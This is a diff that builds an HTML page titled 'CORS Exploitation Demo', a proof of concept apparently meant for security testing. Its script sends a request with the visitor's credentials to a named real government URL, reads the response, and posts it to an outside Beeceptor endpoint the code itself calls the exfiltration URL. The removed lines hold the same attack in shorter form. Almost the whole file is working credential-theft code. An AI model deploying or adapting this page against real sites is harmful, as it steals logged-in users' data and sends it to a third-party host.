@@ -1,11 +1,70 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>CORS Proof of Concept</title>
+  <style>
+    body { font-family: Arial, sans-serif; max-width: 800px; margin: 40px auto; padding: 20px; background: #f4f4f4; }
+    h1 { color: #333; }
+    #status { padding: 15px; background: #fff; border-radius: 8px; margin: 20px 0; min-height: 50px; }
+    .loading { color: orange; }
+    .success { color: green; }
+    .error { color: red; }
+    pre { background: #eee; padding: 10px; border-radius: 5px; overflow: auto; }
+  </style>
+</head>
+<body>
+  <h1>CORS Exploitation Demo</h1>
+  <p>This page demonstrates a potential CORS misconfiguration on the target application.</p>
+  
+  <div id="status" class="loading">Loading... Script starting.</div>
+  
+  <pre id="data"></pre>
 
-<script>
-  fetch('https://access.cisa.gov/cdn-cgi/rum?', {
-    credentials: 'include'
-  })
-  .then(r => r.text())
-  .then(data => {
-    fetch('https://cors-poc-beeceptor-com.free.beeceptor.com', {method: 'POST', body: data});
-  });
-</script>
+  <script>
+    const targetUrl = 'https://access.cisa.gov/cdn-cgi/rum?';  // CHANGE THIS
+    const exfilUrl = 'https://cors-poc-beeceptor-com.free.beeceptor.com';            // CHANGE THIS (your Beeceptor URL)
 
+    const statusEl = document.getElementById('status');
+    const dataEl = document.getElementById('data');
+
+    statusEl.textContent = 'Attempting to fetch data from target...';
+    statusEl.className = 'loading';
+
+    fetch(targetUrl, {
+      method: 'GET',                  // Change to POST if needed
+      credentials: 'include'
+    })
+    .then(response => {
+      if (!response.ok) throw new Error(`Target responded ${response.status}`);
+      statusEl.textContent = 'Target reached successfully. Reading response...';
+      return response.text();
+    })
+    .then(data => {
+      statusEl.textContent = 'Data captured! Exfiltrating...';
+      statusEl.className = 'success';
+      dataEl.textContent = data;  // Show stolen data on page (for demo only)
+
+      return fetch(exfilUrl, {
+        method: 'POST',
+        body: data,
+        headers: { 'Content-Type': 'text/plain' }
+      });
+    })
+    .then(() => {
+      statusEl.textContent = 'Exfiltration complete! Check your Beeceptor dashboard.';
+      statusEl.className = 'success';
+    })
+    .catch(err => {
+      statusEl.textContent = 'Error: ' + err.message;
+      statusEl.className = 'error';
+      console.error(err);
+    });
+  </script>
+
+  <footer>
+    <p><small>For authorized testing only. Remove after demonstration.</small></p>
+  </footer>
+</body>
+</html>
